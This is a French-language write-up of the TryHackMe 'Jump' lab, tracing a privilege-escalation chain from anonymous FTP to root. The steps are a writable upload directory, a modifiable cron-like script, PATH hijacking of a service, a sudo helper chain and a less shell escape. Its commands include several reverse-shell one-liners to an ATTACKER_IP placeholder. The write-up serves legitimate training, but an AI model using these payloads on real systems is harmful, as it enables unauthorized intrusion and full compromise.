---
type: write-up
platform: TryHackMe
room: Jump
os: Linux
category:
  - privilege-escalation
status: completed
date: 2026-09-14
tags:
  - pentest/write-up
  - tryhackme
  - linux
  - privilege-escalation
  - ftp
  - path-hijacking
  - sudo
---
# 1. Reconnaissance initiale

## Scan Nmap

```bash
nmap -sC -sV <TARGET_IP>
```

### Résultat utile

```text
21/tcp open  ftp  vsftpd 3.0.5
22/tcp open  ssh  OpenSSH

Anonymous FTP login allowed
incoming/ writable
pub/
```



# 2. Anonymous FTP → recon_user

## Énumération FTP

```bash
ftp <TARGET_IP>
```

Connexion :

```text
Name: anonymous
Password: [Entrée]
```

Énumération :

```text
ftp> ls -la
ftp> cd pub
ftp> ls -la
ftp> get README.txt
```

Le README indique que les fichiers placés dans `incoming/` sont traités automatiquement.

### Hypothèse

Si le pipeline exécute certains scripts déposés dans `incoming`, un fichier contrôlé par l'attaquant peut être exécuté avec les privilèges du compte qui traite les uploads.

## Reverse shell

Création sur l'AttackBox :

```bash
cat > recon.sh <<'EOF'
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
EOF
```

Listener :

```bash
nc -lvnp 4444
```

Upload FTP :

```text
ftp> cd incoming
ftp> put recon.sh
```

Le pipeline exécute le fichier et un shell revient sur le listener.



# 3. Reconnaissance locale comme recon_user

Commandes réflexes :

```bash
whoami
id
pwd
ls -la
ls -la /home
sudo -l
```

`id` révèle notamment :

```text
recon_user
member of: dev_user, devops
```

Le home de `dev_user` possède des permissions de groupe permettant à `recon_user` d'y entrer et de lire certains fichiers.



# 4. recon_user → dev_user : script périodique modifiable

## Découverte

Énumération de `/opt` :

```bash
ls -la /opt
ls -la /opt/*
```

Élément intéressant :

```text
/opt/dev/backup.sh
owner: dev_user
group: dev_user
permissions: rwxrwxr-x
```

Contenu :

```bash
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user
```

Comme `recon_user` appartient au groupe `dev_user`, il peut **modifier** ce script.

## Vérifier qu'il est exécuté comme dev_user

Les recherches visibles dans `cron` et `systemd` ne révélaient pas directement le lanceur. Il fallait donc observer l'effet du script.

```bash
stat /tmp/recon_backup.tgz
```

Le fichier appartient à :

```text
dev_user:dev_user
```

Surveillance du timestamp :

```bash
for i in $(seq 1 30); do
  stat -c '%y | %U:%G | %s bytes' /tmp/recon_backup.tgz 2>/dev/null
  sleep 2
done
```

Le `mtime` change environ toutes les minutes et le fichier reste créé par `dev_user`.

### Conclusion

```text
backup.sh modifiable par recon_user via le groupe
+
backup.sh exécuté périodiquement comme dev_user
=
exécution de code comme dev_user
```

## Exploitation

Listener :

```bash
nc -lvnp 5555
```

Remplacement du script :

```bash
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1"\n' > /opt/dev/backup.sh
```

Vérification :

```bash
cat /opt/dev/backup.sh
ls -l /opt/dev/backup.sh
```

Au prochain passage du job :

```bash
whoami
id
```

Résultat attendu :

```text
dev_user
```



# 5. dev_user → monitor_user : PATH hijacking

## Découverte du service

Énumération des processus :

```bash
ps aux | grep -E 'monitor|cron|script|backup'
```

Un service tourne comme `monitor_user` :

```text
/bin/bash /usr/local/bin/healthcheck
```

Configuration :

```bash
systemctl cat healthcheck.service
```

Extrait :

```ini
[Service]
Type=simple
User=monitor_user
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
```

Script exécuté :

```bash
#!/bin/bash
echo "Running as: $(whoami)"
while true; do
  ps aux | grep -v grep
  sleep 5
done
```

## Vulnérabilité

Le script appelle :

```bash
ps
```

et non :

```bash
/usr/bin/ps
```

Avec le `PATH` du service :

```text
/opt/dev/bin
/usr/local/bin
/usr/bin
```

Linux cherche donc d'abord :

```text
/opt/dev/bin/ps
```

Or ce chemin est contrôlé par `dev_user`.

## Condition importante rencontrée

Le fichier `/opt/dev/bin/ps` n'était initialement pas exécutable.

Avec `recon_user`, l'appartenance au groupe permettait d'écrire dans le fichier mais pas de changer son mode, car seul le propriétaire ou root peut normalement effectuer `chmod`.

Une fois réellement `dev_user`, il devient possible de faire :

```bash
chmod +x /opt/dev/bin/ps
```


## Exploitation

Listener :

```bash
nc -lvnp 6666
```

Création du faux `ps` :

```bash
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/6666 0>&1"\n' > /opt/dev/bin/ps
chmod +x /opt/dev/bin/ps
```

Au prochain appel de `ps aux` par `healthcheck`, le faux binaire est exécuté comme `monitor_user`.

Vérification :

```bash
whoami
id
```

Résultat attendu :

```text
monitor_user
```

## Erreur utile : le PATH malveillant est hérité

Le shell `monitor_user` obtenu hérite du `PATH` du service :

```text
/opt/dev/bin:/usr/local/bin:/usr/bin
```

Donc taper simplement :

```bash
ps
```

relance le faux `/opt/dev/bin/ps`, ce qui ouvre de nouveaux reverse shells et rend le diagnostic confus.

Correction :

```bash
export PATH=/usr/local/bin:/usr/bin:/bin
which ps
```

Résultat attendu :

```text
/usr/bin/ps
```



# 6. monitor_user → ops_user : sudo + helper modifiable

## Énumération sudo

```bash
sudo -n -l
```

`-n` signifie **non-interactive** : `sudo` échoue au lieu de demander un mot de passe. C'est pratique dans un reverse shell instable.

Résultat utile :

```text
(ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

`monitor_user` peut donc exécuter ce script en tant que `ops_user` sans mot de passe.

## Analyse de la chaîne d'exécution

```bash
cat /usr/local/bin/deploy.sh
```

Contenu :

```bash
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```

Puis :

```bash
ls -l /opt/app/deploy_helper.sh
```

Le helper appartient à `monitor_user` et peut être modifié par lui.

### Vulnérabilité


```text
monitor_user
   ↓ sudo NOPASSWD
/usr/local/bin/deploy.sh   [exécuté comme ops_user]
   ↓
./deploy_helper.sh         [contrôlé par monitor_user]
   ↓
code execution as ops_user
```

## Exploitation

Sauvegarde facultative :

```bash
cp /opt/app/deploy_helper.sh /tmp/deploy_helper.sh.bak
```

Listener :

```bash
nc -lvnp 8888
```

Remplacement du helper :

```bash
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/8888 0>&1"\n' > /opt/app/deploy_helper.sh
```

Déclenchement :

```bash
sudo -u ops_user /usr/local/bin/deploy.sh
```

Vérification dans le nouveau shell :

```bash
whoami
id
```

Résultat attendu :

```text
ops_user
```

## Notion à retenir : auditer toute la chaîne

Lorsqu'une commande est autorisée via `sudo`, ne pas auditer uniquement cette commande.

Il faut examiner :

```text
sudo command
  ↓
scripts appelés
  ↓
fichiers sourcés
  ↓
binaires externes
  ↓
variables d'environnement
  ↓
répertoires / fichiers modifiables
```


---

# 7. ops_user → root : sudo less et shell escape

## Énumération

```bash
sudo -n -l
```

Résultat :

```text
(root) NOPASSWD: /usr/bin/less
```

`ops_user` peut lancer `less` comme root sans mot de passe.

## Pourquoi `less` est dangereux avec sudo

`less` est un pager interactif. Il peut exécuter une commande shell depuis son interface avec :

```text
!<COMMAND>
```

Exemple :

```text
!/bin/bash
```

Si `less` tourne comme root, le shell lancé hérite de ces privilèges.

## Première tentative et erreur

Depuis le reverse shell :

```bash
sudo /usr/bin/less /etc/hosts
```

Le fichier est affiché puis `less` quitte immédiatement. Ensuite :

```text
!/bin/bash
```

est interprété par Bash et échoue.

### Cause

Le reverse shell n'avait pas de vrai terminal interactif.

Messages typiques vus plus tôt :

```text
cannot set terminal process group
no job control in this shell
```

Un reverse shell fournit un flux stdin/stdout, mais pas nécessairement un **TTY** complet.

## Upgrade du TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
tty
```

`tty` doit maintenant retourner un pseudo-terminal, par exemple :

```text
/dev/pts/0
```

Relancer :

```bash
sudo /usr/bin/less /etc/hosts
```

Puis, **dans l'interface de `less`** :

```text
!/bin/bash
```

Vérification :

```bash
whoami
id
```

Résultat attendu :

```text
root
uid=0(root)
```




# 8. Chaîne d'attaque finale

```text
Anonymous FTP
    ↓
Writable incoming/ + traitement automatique
    ↓
recon_user
    ↓
Permissions de groupe dev_user
    ↓
/opt/dev/backup.sh modifiable
    ↓
Job périodique exécuté comme dev_user
    ↓
dev_user
    ↓
healthcheck.service avec PATH dangereux
    ↓
/opt/dev/bin/ps contrôlé par dev_user
    ↓
PATH hijacking
    ↓
monitor_user
    ↓
sudo NOPASSWD deploy.sh as ops_user
    ↓
deploy.sh appelle un helper contrôlé par monitor_user
    ↓
ops_user
    ↓
sudo NOPASSWD /usr/bin/less as root
    ↓
TTY upgrade + !/bin/bash
    ↓
root
```

---
